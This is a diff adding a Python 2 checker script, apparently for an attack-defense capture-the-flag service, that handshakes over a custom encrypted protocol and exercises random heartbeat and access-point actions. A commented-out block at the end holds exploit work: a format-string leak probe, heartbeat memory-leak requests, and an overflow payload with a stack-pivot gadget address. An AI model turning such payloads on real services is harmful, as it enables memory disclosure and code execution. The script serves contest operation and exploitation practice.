@@ -1,0 +1,959 @@
+#!/usr/bin/env python
+
+import time
+import socket
+import sys
+import binascii
+import struct
+import shlex
+import hashlib
+import random
+from DiffieHellman import DiffieHellman
+
+PORT = 799
+SIZE = 4000
+
+dh_prime = 1552518092300708935130918131258481755631334049434514313202351194902966239949102107258669453876591642442910007680288864229150803718918046342632727613031282983744380820890196288509170691316593175367469551763119843371637221007210577919
+
+dh_generator = 2
+
+def run_cipher( v, key ):
+	v0,v1 = v[0],v[1]
+	cipher_key = struct.unpack( '4I', key )
+
+	mask = 0xffffffff
+	delta = 0x83E778B9
+	cipher_sum = (delta * 16) & mask
+
+	i=0	
+	while i < 16:	
+		v0 = (v0 + ((((((v1 << 4) & mask) ^ (v1 >> 5)) + v1) & mask) ^ ((cipher_sum + cipher_key[cipher_sum & 0x3]) & mask))) & mask
+		cipher_sum = ((cipher_sum + delta) & mask)
+		v1 = (v1 + ((((((v0 << 4) & mask) ^ (v0 >> 5)) + v0) & mask) ^ ((cipher_sum + cipher_key[(cipher_sum>>11)&0x3]) & mask))) & mask
+
+		i+=1
+
+	return v0,v1	
+
+def cipher_data( message_data, cipher_state, cipher_key ):
+	i = 0
+	
+	cipher_data = ''
+	while i < len(message_data):
+		if ( i % 8 == 0 ):
+			cipher_state = run_cipher( cipher_state, cipher_key )
+
+		v0 = cipher_state[0]
+		v1 = cipher_state[1]
+
+		state_data = struct.pack( "2I", v0, v1 )
+
+		cipher_data += struct.pack( 'B', ord(message_data[i]) ^ ord(state_data[i%8]) )
+		i+=1
+
+	return cipher_data, cipher_state
+
+def int_to_bytes(val, num_bytes):
+	i = 0
+	result_bytes = ''
+	while i < num_bytes:
+		result_bytes += struct.pack( 'B', val & 0xff )
+		
+		val >>= 8
+		i += 1
+
+	return result_bytes
+
+def bytes_to_int( byte_string, num_bytes):
+	byte_string = byte_string[::-1]
+	i = 0
+	result_int = 0
+	while i < num_bytes:
+		result_int <<= 8
+		result_int += ord(byte_string[i])
+
+		i+=1
+
+	return result_int	
+
+def crc16( in_data ):
+
+	POLY = 0x8408
+	pos = 0	
+	crc = 0xffff
+	data = 0
+	
+	while pos < len(in_data):
+		i = 0
+		data = ord(in_data[pos]) & 0xff
+		while i < 8:
+			if ( (crc & 0x0001) ^ (data & 0x0001) ):
+				crc = (crc >> 1) ^ POLY
+			else:
+				crc >>= 1
+			i+=1
+			data >>= 1
+		pos+=1
+
+	crc = ~crc
+	data = crc
+	crc = ((crc << 8) & 0xff00) | (data >> 8 & 0xff)
+
+	return crc
+
+def recv_until( sockfd, numbytes ):
+	i = 0
+	data_str = ''
+	while i < numbytes:
+		data = sockfd.recv(1)
+		
+		data_str += data
+		i+=1
+
+	return data_str
+		
+		
+
+def recv_line( sockfd ):
+        response = ""
+        while True:
+
+                data = sockfd.recv(1)
+
+                if not data:
+                        break
+
+                if ( data == '\n' ):
+                        break
+
+                response += data
+
+        return response
+
+class RXCConnection:
+	def __init__(self):
+		self.verbose_logs = False
+	
+	def start_dedicated_connection( self, sockfd ):
+		self.sockfd = sockfd
+		self.dh_obj = DiffieHellman() 
+
+		public_key_bytestring = int_to_bytes( self.dh_obj.publicKey, 96 )
+
+		# Turn on debug mode
+		# First update block size -- for security mode parametersf
+		self.blocksize = (int(random.randint( 102, 160 ) / 2)*2)-4
+		byte_string = '\x79\x31' + struct.pack( 'B', self.blocksize+4 ) + "\x00"*29
+		
+		sockfd.sendall(byte_string)
+
+		data_string = '\x17\x70' + public_key_bytestring
+		data_string = data_string + (chr(random.randint(0, 255)) * (self.blocksize - len(data_string)))
+		crc_value = crc16( data_string )
+
+		byte_string = '\xe3\x00' + struct.pack( '<H', crc_value ) + data_string
+
+		print "Sending new byte string %d\n" % len(byte_string)
+		sockfd.sendall(byte_string)
+
+		response_data = recv_until( sockfd, self.blocksize+4 )
+
+		if ( ord(response_data[4]) != 0x17 or ord(response_data[5]) != 0x9d ):
+			print "Failed to get security parameters response!\n"
+			return False
+
+		security_parameters = response_data[6:6+96]
+	
+		# LOGS	
+		if ( self.verbose_logs ):
+			print "Length of security parameters is: %d\n" % len(security_parameters) 	
+
+		# Generate DH shared secret
+		server_public_key = bytes_to_int( security_parameters, 96 )
+
+		# Generate DH secret
+		self.dh_obj.genKey(server_public_key)
+
+		# shared secret
+		shared_secret = self.dh_obj.genSecret( self.dh_obj.privateKey, server_public_key )
+
+		# Shared secret bytes
+		shared_secret_bytes = int_to_bytes( shared_secret, 96 )
+
+		# Get MD5 hash
+		shared_secret_md5 = hashlib.md5( shared_secret_bytes[0:48] ).digest() + hashlib.md5( shared_secret_bytes[48:] ).digest()
+
+		if ( self.verbose_logs ):	
+			print "Shared secret (md5):\n"
+			print binascii.hexlify(shared_secret_md5)
+		
+		self.cipher_key = shared_secret_md5[0:16]
+		self.ul_cipher_state = struct.unpack( '2I', shared_secret_md5[16:24] )
+		self.dl_cipher_state = struct.unpack( '2I', shared_secret_md5[24:32] )
+
+		self.crc_flag = True
+		self.rx_block_counter = 1
+		self.tx_block_counter = 1
+
+		self.dch_sequence_number = 0
+
+		#self.blocksize = 98
+
+		return True
+	
+
+	def send_dch_message( self, dch_message_data, seqnumber ):
+		
+		fragment_count = len(dch_message_data) / (self.blocksize-3)
+
+		if ( len(dch_message_data) % (self.blocksize-3) ):
+			fragment_count += 1
+
+		if ( fragment_count > 16 ):
+			print "Data too long for block size (not enough fragments) in send_dch_message\n"
+			fragment_count = 16
+
+		i = 0
+		pos = 0
+		while ( i < fragment_count ):
+			
+			data_len_for_fragment = len(dch_message_data) - pos
+			if ( data_len_for_fragment > (self.blocksize-3) ):
+				data_len_for_fragment = (self.blocksize-3)
+		
+			if ( i == (fragment_count-1) ):
+				lf_bit = 1
+			else:
+				lf_bit = 0
+
+			fragment_header = (lf_bit << 15) | ((seqnumber & 0x7FF) << 4) | (i & 0xF)
+
+			msg_data = struct.pack('H', fragment_header) + dch_message_data[pos:pos+data_len_for_fragment]	
+			pos += data_len_for_fragment
+
+			# Pad out to blocksize-1 (we add channel header unencrypted)
+			if ( len(msg_data) < (self.blocksize-1) ):
+				msg_data += '\x00' * ((self.blocksize-1) - len(msg_data))
+
+
+			if ( self.verbose_logs ):
+				print "Data to send before cipher (len=%d):\n" % len(msg_data)
+				print binascii.hexlify(msg_data)
+
+			# Cipher data	
+			message_data_ciphered, self.ul_cipher_state = cipher_data( msg_data, self.ul_cipher_state, self.cipher_key )	
+
+			message_data = '\x73' + message_data_ciphered
+
+			# Now get crc16
+			if ( self.crc_flag ):
+				crc_value = crc16( message_data )
+			
+				# Send message header (with crc)
+				msg_data_to_send = '\xe3' + struct.pack('B', self.tx_block_counter ) + struct.pack('H', crc_value )
+			else:
+				# Send message header (without crc)
+				msg_data_to_send = '\xe3' + struct.pack('B', self.tx_block_counter )
+
+			# Add message data
+			msg_data_to_send += message_data
+			self.tx_block_counter += 1
+
+			if ( self.verbose_logs ):
+				print "Message data to send (len=%d):\n" % len(msg_data_to_send)
+				print binascii.hexlify(msg_data_to_send)
+
+			self.sockfd.sendall( msg_data_to_send )
+
+			i += 1
+
+	def recv_dch_message( self ):
+		# Read until done
+		done = False
+
+		dch_message_data = ''
+		while ( done == False ):
+		
+			recv_count = self.blocksize+2
+			if ( self.crc_flag ):
+				recv_count += 2
+	
+			recv_msg_data = recv_until( self.sockfd, recv_count )
+
+			if ( recv_msg_data[0] != '\xe3' ):
+				print "Error receiving message -- did not receive data indicator\n"
+				return None
+
+			if ( struct.unpack('B', recv_msg_data[1])[0] != self.rx_block_counter ):
+				print "Error receiving message -- rx block counter mismatch (%d,%d)\n" % (struct.unpack('B', recv_msg_data[1] )[0], self.rx_block_counter)
+				return None
+
+			self.rx_block_counter += 1
+
+			msg_data = ''
+			if ( self.crc_flag ):
+				if ( struct.unpack('H', recv_msg_data[2:4])[0] != crc16( recv_msg_data[4:] ) ):
+					print "Error CRC did not match on recv data\n"
+					return None
+	
+				msg_data = recv_msg_data[4:]
+			else:
+				msg_data = recv_msg_data[2:]
+
+			# Process message... check for DCH channel
+			if ( msg_data[0] != '\x73' ):
+				print "Error receiving message - not a DCH message!\n"
+				return None
+
+			# Decrypt!
+			msg_data_to_decrypt = msg_data[1:]
+
+			# Decrypt
+			msg_data, self.dl_cipher_state = cipher_data( msg_data_to_decrypt, self.dl_cipher_state, self.cipher_key )
+
+			# Check length
+			if ( len(msg_data) < 2 ):
+				print "Invalid message length for DCH message -- trying to read fragment header\n"
+				return None
+
+			fragment_header = struct.unpack('H', msg_data[0:2] )[0]
+
+			if ( fragment_header & 0x8000 ):
+				# Last fragment
+				done = True
+
+			dch_message_data += msg_data[2:]
+
+		return dch_message_data	
+		
+	def send_heartbeat_request( self, heartbeat_msg ):
+		
+		data_string = '\x71' + struct.pack( 'H', len(heartbeat_msg) ) + heartbeat_msg
+
+		self.dch_sequence_number += 1
+		self.send_dch_message( data_string, self.dch_sequence_number )
+
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( len(recv_msg_data) < len(heartbeat_msg)+3 ):
+			print "Error -- Heart Beat response -- length too small\n"
+			return False
+
+		if ( recv_msg_data[0] != '\xe2' ):
+			print "Error -- Heart Beat response -- incorrect header\n"
+			return False
+
+		heartbeat_response_len = struct.unpack( 'H', recv_msg_data[1:3] )[0]
+
+		if ( len(recv_msg_data)-3 < heartbeat_response_len ):
+			print "Heart Beat Response Length mismatched (%d != %d)\n" % (len(recv_msg_data)-3, heartbeat_response_len)
+			return False
+
+		if ( len(heartbeat_msg) != heartbeat_response_len ):
+			print "Heart Beat Response Length did not match original heartbeat message length\n"
+			return False
+
+		if ( recv_msg_data[3:3+len(heartbeat_msg)] != heartbeat_msg ):
+			print "Error -- Heart Beat response -- mismatch in message data\n"
+			print binascii.hexlify(recv_msg_data[3:3+len(heartbeat_msg)])
+			print binascii.hexlify(heartbeat_msg)
+			return False
+
+		return True
+							
+
+	def send_ap_setup_request( self, apname, aptype, apspeed ):
+
+		data_string = '\x23' + struct.pack('B', aptype ) + struct.pack('B', apspeed ) + struct.pack('B', len(apname) ) + apname
+	
+		self.dch_sequence_number += 1	
+		self.send_dch_message( data_string, self.dch_sequence_number )
+
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data[0] != '\x5e' ):
+			print "Error -- Setup AP response -- incorrect header\n"
+			return None
+
+		if ( recv_msg_data[1] == '\x02' ):
+			print "AP already exists\n"
+			return struct.unpack( "I", recv_msg_data[2:6] )[0]
+		
+		if ( recv_msg_data[1] != '\x00' ):
+			print "Error -- Setup AP response -- setup failure\n"
+			return None
+
+		if ( self.verbose_logs ):
+			print "Setup AP Response:\n"
+			print binascii.hexlify(recv_msg_data)
+
+		# Return the newly created AP ID (as an integer)
+		return struct.unpack('I', recv_msg_data[2:6] )[0]
+
+	def send_ap_destroy_request( self, apid ):
+		data_string = '\x87' + struct.pack('I', apid )
+
+		self.dch_sequence_number += 1
+		self.send_dch_message( data_string, self.dch_sequence_number )
+	
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data[0] != '\x94' ):
+			print "Error -- Destroy AP Response -- incorrect header\n"
+			return False
+
+		if ( recv_msg_data[1] == '\x02' ):
+			print "Error -- Response for Destroy Request -- AP ID not found\n"
+			return False
+
+		if ( recv_msg_data[1] != '\x00' ):
+			print "Error -- Response for Destroy Request -- Failed\n"
+			return False
+
+		return True
+	
+	def send_ap_info_request( self, apid ):
+		data_string = '\x52' + struct.pack('I', apid )
+
+		self.dch_sequence_number += 1
+		self.send_dch_message( data_string, self.dch_sequence_number )
+	
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data[0] != '\x28' ):
+			print "Error -- Info AP Response -- incorrect header\n"
+			return False
+
+		if ( recv_msg_data[1] == '\x02' ):
+			print "Error -- Response for Info Request -- AP ID not found\n"
+			return False
+
+		if ( recv_msg_data[1] != '\x00' ):
+			print "Error -- Response for Info Request -- Failed\n"
+			return False
+
+		return recv_msg_data
+
+
+	def send_fast_message( self, msg_data ):
+		
+		if ( len(msg_data) > (self.blocksize-1) ):
+			print "Can't send fast message -- too large for blocksize!\n"
+			return None
+
+		if ( len(msg_data) < (self.blocksize-1) ):
+			msg_data += '\x00' * ((self.blocksize-1) - len(msg_data))
+
+		message_data_ciphered, self.ul_cipher_state = cipher_data( msg_data, self.ul_cipher_state, self.cipher_key )	
+
+		message_data = '\xc3' + message_data_ciphered
+
+		# Now get crc16
+		if ( self.crc_flag ):
+			crc_value = crc16( message_data )
+			
+			# Send message header (with crc)
+			msg_data_to_send = '\xe3' + struct.pack('B', self.tx_block_counter ) + struct.pack('H', crc_value )
+		else:
+			# Send message header (without crc)
+			msg_data_to_send = '\xe3' + struct.pack('B', self.tx_block_counter )
+
+		# Add message data
+		msg_data_to_send += message_data
+		self.tx_block_counter += 1
+
+		if ( self.verbose_logs ):
+			print "Message data to send (len=%d):\n" % len(msg_data_to_send)
+			print binascii.hexlify(msg_data_to_send)
+
+		sockfd.sendall( msg_data_to_send )
+
+		return len(msg_data_to_send)
+
+	def recv_fast_message( self ):
+		recv_count = self.blocksize+2
+		if ( self.crc_flag ):
+			recv_count += 2
+
+		recv_msg_data = recv_until( self.sockfd, recv_count )
+
+		if ( len(recv_msg_data) != recv_count ):
+			print "Error on receive!\n"
+			return None
+
+		if ( recv_msg_data[0] != '\xe3' ):
+			print "Error receiving message -- did not receive data indicator\n"
+			return None
+
+		if ( struct.unpack('B', recv_msg_data[1])[0] != self.rx_block_counter ):
+			print "Error receiving message -- rx block counter mismatch (%d,%d)\n" % (struct.unpack('B', recv_msg_data[1] )[0], self.rx_block_counter)
+			return None
+
+		self.rx_block_counter += 1
+
+		msg_data = ''
+		if ( self.crc_flag ):
+			if ( struct.unpack('H', recv_msg_data[2:4])[0] != crc16( recv_msg_data[4:] ) ):
+				print "Error CRC did not match on recv data\n"
+				return None
+
+			msg_data = recv_msg_data[4:]
+		else:
+			msg_data = recv_msg_data[2:]
+
+		# Process message... check for DCH channel
+		if ( msg_data[0] != '\xc3' ):
+			print "Error receiving message - not a FAST message!\n"
+			return None
+
+		# Decrypt!
+		msg_data_to_decrypt = msg_data[1:]
+
+		# Decrypt
+		msg_data, self.dl_cipher_state = cipher_data( msg_data_to_decrypt, self.dl_cipher_state, self.cipher_key )
+
+		return msg_data	
+
+	def send_ap_data_write_request( self, ap_id, write_data ):
+		fast_msg = '\x01' + struct.pack( 'I', ap_id ) + struct.pack( 'B', len(write_data) ) + write_data
+
+		if ( self.send_fast_message( fast_msg ) ):
+			recv_msg = self.recv_fast_message( )
+
+			return recv_msg
+		else:
+			print "Failed to send AP data write request"
+			return None
+
+	def do_action_ap_integrity_check( self ):
+		# Perform an integrity check functionality -- first create an AP, then write data to it, then check the integrity of the data -- then destroy it
+		new_ap_name = ''.join(chr(random.randint(0,255)) for _ in range(random.randint(0,120)))
+
+		new_ap_id = self.send_ap_setup_request( new_ap_name, random.randint(0, 255), random.randint(0, 255) )
+
+		if ( new_ap_id is None ):
+			return False
+		
+		if ( new_ap_id not in self.ap_id_list ):
+			self.ap_id_list.append( new_ap_id )	
+
+		# Send a write request
+		write_msg_data = ''.join(chr(random.randint(0,255)) for _ in range(random.randint(0,self.blocksize-8)))
+		recv_msg = self.send_ap_data_write_request( new_ap_id, write_msg_data ) 	
+		
+		if ( recv_msg is None ):
+			print "AP Integrity Check -- RECV failed on write data request\n"
+			return False
+	
+		if ( len(recv_msg) < 6 ):
+			print "AP Integrity Check -- Invalid length returned for write request (%d).\n" % len(recv_msg)
+			return False
+
+		if ( recv_msg[0] != '\x01' ):
+			print "AP Integrity Check -- Missing write header.\n"
+			return False
+
+		ap_response_id = struct.unpack("I", recv_msg[1:5] )[0]
+		ap_write_len = struct.unpack("B", recv_msg[5:6] )[0]
+
+		if ( ap_response_id != new_ap_id ):
+			print "AP Integrity Check -- Invalid AP ID returned -- did not match send AP ID.\n"
+			return False
+
+		if ( ap_write_len != len(write_msg_data) ):
+			print "AP Integrity Check -- Invalid length returned for write request -- length did not match sent (%d != %d).\n" % (ap_write_len, len(write_msg_data) )
+			return False
+
+		# Write succeeded -- now perform integrity check on it
+		check_start = random.randint( 0, len(write_msg_data) )
+		check_end = random.randint( check_start, len(write_msg_data) )
+
+		check_length = check_end - check_start
+			
+		print "Check start %d check length %d (total length: %d)\n" % (check_start, check_length, len(write_msg_data))
+
+		# Form integrity check message
+		integrity_check_msg = '\x3f' + struct.pack( 'H', check_length ) + struct.pack( 'I', new_ap_id ) + struct.pack( 'H', check_start )
+
+		self.dch_sequence_number += 1
+		self.send_dch_message( integrity_check_msg, self.dch_sequence_number )
+
+		check_response = self.recv_dch_message( )
+
+		if ( check_response is None ):
+			print "Failed to get check response!\n"
+			return False
+
+		if ( len(check_response) < 10 ):
+			print "AP Integrity Check -- Check response must be at least 10-bytes\n"
+			return False
+
+		if ( check_response[0] != '\xaa' ):
+			print "AP Integrity Check -- Check response invalid header\n"
+			return False
+
+		if ( check_response[1] != '\x8f' ):
+			print "AP Integrity Check -- Check response invalid success ID (%02X)\n" % struct.unpack('B', check_response[1] )[0]
+			return False
+
+		check_ap_id = struct.unpack( 'I', check_response[2:6] )[0]
+		check_crc32 = struct.unpack( 'I', check_response[6:10] )[0]
+
+		if ( check_ap_id != new_ap_id ):
+			print "AP Integrity Check -- Check response -- AP ID did not match created one.\n"
+			return False
+
+		# Validate crc32
+		crc_msg = write_msg_data[check_start:check_end]
+
+		if ( len(crc_msg) == 0 ):
+			validate_crc32 = 0xaec35c57
+		else:
+			validate_crc32 = (binascii.crc32( crc_msg, 0xaec35c57 ) & 0xffffffff)
+
+		if ( check_crc32 != validate_crc32 ):
+			print "AP Integrity Check -- CRC32 mismatch -- (%08X != %08X)\n" % (check_crc32, validate_crc32)
+			return False
+
+		# Destroy AP 
+		data_string = '\x87' + struct.pack('I', new_ap_id )
+
+		self.dch_sequence_number += 1
+		self.send_dch_message( data_string, self.dch_sequence_number )
+	
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data[0] != '\x94' ):
+			print "AP Integrity Check -- Error -- Destroy AP Response -- incorrect header\n"
+			return False
+
+		if ( recv_msg_data[1] != '\x00' ):
+			print "AP Integrity Check -- Error -- Response for Destroy Request -- Failed\n"
+			return False
+
+		self.ap_id_list.remove( new_ap_id )	
+
+		return True
+		
+
+	def do_action_ap_write_read_data( self ):
+		# Pick an AP ID
+		if ( random.randint( 0, 10 ) == 0 ):
+			pick_bad_apid = True
+		else:
+			pick_bad_apid = False
+
+		if ( len(self.ap_id_list) == 0 ):
+			pick_bad_apid = True
+
+		if ( pick_bad_apid ):
+			while True:
+				ap_id = random.randint( 0, (0xffffffff) )
+	
+				if ( ap_id in self.ap_id_list ):
+					pass
+				else:
+					break
+		else:
+			ap_id = random.choice( self.ap_id_list )
+
+		write_msg_data = ''.join(chr(random.randint(0,255)) for _ in range(random.randint(0,20)))
+		fast_msg = '\x01' + struct.pack( 'I', ap_id ) + struct.pack( 'B', len(write_msg_data) ) + write_msg_data
+		
+		if ( self.send_fast_message( fast_msg ) ):
+			recv_msg = self.recv_fast_message( )
+		else:
+			print "Failed to send AP data write request"
+			return False
+
+		if ( pick_bad_apid ):
+			if ( len(recv_msg) < 2 ):
+				print "AP Data Write request -- Invalid length return when bad AP ID chosen.\n"
+				return False
+
+			if ( recv_msg[0] != '\x17' or recv_msg[1] != '\x33' ):
+				print "AP Data Write request -- picked bad AP and did not receive AP NOT FOUND response.\n"
+				return False
+		else:
+			if ( len(recv_msg) < 6 ):
+				print "AP Data Write request -- Invalid length returned for write request (%d).\n" % len(recv_msg)
+				return False
+
+			if ( recv_msg[0] != '\x01' ):
+				print "AP Data Write request -- Missing write header.\n"
+				return False
+
+			ap_response_id = struct.unpack("I", recv_msg[1:5] )[0]
+			ap_write_len = struct.unpack("B", recv_msg[5:6] )[0]
+
+			if ( ap_response_id != ap_id ):
+				print "AP Data Write request -- Invalid AP ID returned -- did not match send AP ID.\n"
+				return False
+
+			if ( ap_write_len != len(write_msg_data) ):
+				print "AP Data Write request -- Invalid length returned for write request -- length did not match sent (%d != %d).\n" % (ap_write_len, len(write_msg_data) )
+				return False
+
+		# ALL GOOD -- now read it back
+		fast_msg = '\x02' + struct.pack( 'I', ap_id ) + struct.pack( 'B', len(write_msg_data) )
+
+		if ( self.send_fast_message( fast_msg ) ):
+			recv_msg = self.recv_fast_message( )
+		else:
+			print "Failed to send AP data read request\n"
+			return False
+
+		if ( pick_bad_apid ):
+			if ( len(recv_msg) < 2 ):
+				print "AP Data Read request -- Invalid length return when bad AP ID chosen.\n"
+				return False
+
+			if ( recv_msg[0] != '\x17' or recv_msg[1] != '\x33' ):
+				print "AP Data Read request -- picked bad AP and did not receive AP NOT FOUND response.\n"
+				return False
+		else:
+			if ( len(recv_msg) < 6 ):
+				print "AP Data Read request -- Invalid length returned for write request (%d).\n" % len(recv_msg)
+				return False
+
+			if ( recv_msg[0] != '\x02' ):
+				print "AP Data Read request -- Missing write header.\n"
+				return False
+
+			ap_response_id = struct.unpack("I", recv_msg[1:5] )[0]
+			ap_read_len = struct.unpack("B", recv_msg[5:6] )[0]
+
+			if ( ap_response_id != ap_id ):
+				print "AP Data Read request -- Invalid AP ID returned -- did not match send AP ID.\n"
+				return False
+
+			if ( ap_read_len != len(write_msg_data) ):
+				print "AP Data Write request -- Invalid length returned for write request -- length did not match sent (%d != %d).\n" % (ap_read_len, len(write_msg_data) )
+				return False
+
+		# Done
+		return True
+			
+		
+	def do_action_heartbeat( self ):
+		heartbeat_message = ''.join(chr(random.randint(0,255)) for _ in range(random.randint(0,320)))
+
+		return self.send_heartbeat_request( heartbeat_message )
+	
+	def do_action_ap_setup( self ):
+		new_ap_name = ''.join(chr(random.randint(0,255)) for _ in range(random.randint(0,120)))
+
+		new_ap_id = self.send_ap_setup_request( new_ap_name, random.randint(0, 255), random.randint(0, 255) )
+
+		if ( new_ap_id is None ):
+			return False
+
+		if ( new_ap_id not in self.ap_id_list ):
+			self.ap_id_list.append( new_ap_id )	
+
+		return True
+
+	def do_action_ap_delete( self ):
+
+		# 1 in 10 chance of picking an AP ID that doesn't exist
+		if ( random.randint( 0, 10 ) == 0 ):
+			pick_bad_apid = True
+		else:
+			pick_bad_apid = False
+
+		if ( len(self.ap_id_list) == 0 ):
+			pick_bad_apid = True
+
+		if ( pick_bad_apid ):
+		
+			while True:	
+				ap_id = random.randint( 0, (0xffffffff) )
+			
+				if ( ap_id in self.ap_id_list ):
+					pass
+				else:
+					break
+
+		else:
+			ap_id = random.choice(self.ap_id_list)
+
+		data_string = '\x87' + struct.pack('I', ap_id )
+
+		self.dch_sequence_number += 1
+		self.send_dch_message( data_string, self.dch_sequence_number )
+	
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data[0] != '\x94' ):
+			print "Error -- Destroy AP Response -- incorrect header\n"
+			return False
+
+		if ( recv_msg_data[1] == '\x02' and pick_bad_apid is True ):
+			return True
+		elif ( recv_msg_data[1] != '\x02' and pick_bad_apid is True ):
+			return False
+
+		if ( recv_msg_data[1] != '\x00' ):
+			print "Error -- Response for Destroy Request -- Failed\n"
+			return False
+
+		self.ap_id_list.remove( ap_id )
+
+		return True
+			
+
+	def do_random_action( self ):
+		action_type = random.randint( 0, 4 )
+		
+		if ( action_type == 0 ):
+			# Heart Beat request
+			print "Running Heart Beat action\n"
+			return self.do_action_heartbeat()
+		elif ( action_type == 1 ):
+			print "Running AP Setup action\n"
+			return self.do_action_ap_setup()
+		elif ( action_type == 2 ):
+			print "Running AP Delete action\n"
+			return self.do_action_ap_delete()
+		elif ( action_type == 3 ):
+			print "Running AP Write/Read Data action\n"
+			return self.do_action_ap_write_read_data()
+		elif ( action_type == 4 ):
+			print "Running AP Integrity Check action\n"
+			return self.do_action_ap_integrity_check()
+			
+
+	def run_poll( self, sockfd ):
+
+		#time.sleep(10)
+		self.ap_id_list = list()
+
+		if ( self.start_dedicated_connection( sockfd ) == False ):
+			print "Failed to start dedicated connection!\n"
+			return False
+
+		# First two bytes are fragment header (16-bit), 0x71 = HEARTBEAT_REQUEST_ID, lastly next two bytes are heart request length (in this case 0x00FF or 255)
+
+		# 3 to 24 random actions
+		action_count = random.randint(3,24)
+
+		for x in range(action_count):
+			if ( self.do_random_action() == False ):
+				return False
+
+		# Pass
+		return True
+
+		'''	
+		heart_message_request = '\x71\x20\x00' + 
+		self.dch_sequence_number += 1
+		self.send_dch_message( heart_message_request, self.dch_sequence_number )
+
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data == None ):
+			print "Error -- did not get DCH message data response\n"
+			return
+
+		print "Heart Beat Request Response:\n"
+		print binascii.hexlify(recv_msg_data)
+		
+		test_ap_id1 = self.send_ap_setup_request( "dupe", 0 )
+		test_ap_id2 = self.send_ap_setup_request( "dupe", 0 )
+
+		test_ap_id = self.send_ap_setup_request( "Test AP %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX", 0 )
+
+		# send a AP data write command -- should crash!
+		self.send_ap_data_write_request( test_ap_id, "blah!!!!" )
+		
+		ap_info_recv = self.send_ap_info_request( test_ap_id )
+
+		print "AP Info Request Response:\n"
+		print ap_info_recv[1:]
+		
+		heart_message_request = '\x71\x00\x06'
+		self.dch_sequence_number += 1
+		self.send_dch_message( heart_message_request, self.dch_sequence_number )
+
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data == None ):
+			print "Error -- did not get DCH message data response\n"
+			return
+
+		print "Heart Beat Request Response:\n"
+		print binascii.hexlify(recv_msg_data)
+
+		# Destroy AP
+		if ( self.send_ap_destroy_request( test_ap_id ) ):
+			print "Successfully destroyed AP ID %d\n" % test_ap_id
+		else:
+			print "Failed to destroy AP ID %d\n" % test_ap_id
+
+		# Get another memory leak of data
+		heart_message_request = '\x71\x00\x06'
+		self.dch_sequence_number += 1
+		self.send_dch_message( heart_message_request, self.dch_sequence_number )
+
+		recv_msg_data = self.recv_dch_message( )
+
+		if ( recv_msg_data == None ):
+			print "Error -- did not get DCH message data response\n"
+			return
+
+		print "Heart Beat Request Response:\n"
+		print binascii.hexlify(recv_msg_data)
+		
+		#self.send_ap_setup_request( 'hello', 0 )
+		# 0x40ba88 -- is jumping into CRC32 seed value -- which is push rbx, pop rsp, ret
+		ap_id = self.send_ap_setup_request( '\xAA'*(64+68+12) + struct.pack('Q', 0x40ba88) + '\xAA'*8, 0 )
+
+		if ( ap_id is None ):
+			print "Failed getting AP ID from setup request\n"
+			return
+		else:
+			# send a AP data write command -- should crash!
+			self.send_ap_data_write_request( ap_id, "blah!!!!" )
+
+		''' 
+
+try:
+    host = "10.5." + sys.argv[1] + ".4"
+    print "Polling team %s\n" % host
+
+except:     # Add localhost as the server if no host provided  
+    host = "127.0.0.1"
+
+try:
+    sockfd = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+
+except socket.error, e:
+        print "Error while Creating socket : ", e
+        sys.exit(-1)
+
+try:
+        sockfd.connect((host,PORT))
+
+except socket.gaierror, e:
+	print "Error (Address-Related) while Connecting to server : ", e
+	sys.exit(-1)
+
+except socket.error , e:
+        print "Error while Connecting to Service : ", e
+        sys.exit(-1)
+try:
+
+	rxc_con = RXCConnection()
+
+	exit_code = 0
+        if ( rxc_con.run_poll(sockfd) == False ):
+		print "Poll Failed!\n"
+		exit_code = -1
+	else:
+		print "Poll Success\n"
+		exit_code = 0
+
+except KeyboardInterrupt:
+        sockfd.shutdown(0)
+
+sys.exit(exit_code)
